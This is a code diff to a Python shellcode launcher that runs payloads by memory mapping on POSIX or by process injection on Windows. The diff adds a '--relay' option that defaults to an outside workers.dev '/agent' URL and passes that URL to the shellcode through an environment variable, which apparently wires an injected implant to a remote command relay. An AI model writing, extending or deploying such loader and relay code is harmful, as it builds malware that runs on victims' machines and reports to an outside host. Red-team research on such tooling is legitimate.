@@ -509,11 +509,21 @@ def main():
                       help='Target architecture (required for local files, optional for remote)')
     parser.add_option('--tag', default=None,
                       help='GitHub release tag (default: preview)')
+    parser.add_option('--relay',
+                      default='https://relay.nostdlib.workers.dev/agent',
+                      help='Relay URL (default: %default)')
     opts, positional = parser.parse_args()
 
     shellcode_path = positional[0] if positional else None
     arch = opts.arch
     tag = opts.tag
+
+    # Propagate relay URL into the environment so the shellcode can read it.
+    # - mmap (POSIX): shellcode reads /proc/self/cmdline which already contains
+    #   --relay, so the env var is a secondary mechanism.
+    # - injection (Windows): child process inherits this env var via CreateProcessW.
+    os.environ['PIA_RELAY'] = opts.relay
+    _log('inf', "Relay URL: %s" % opts.relay)
 
     host_os, host_family, host_bits = get_host()
     python_bits = struct.calcsize("P") * 8
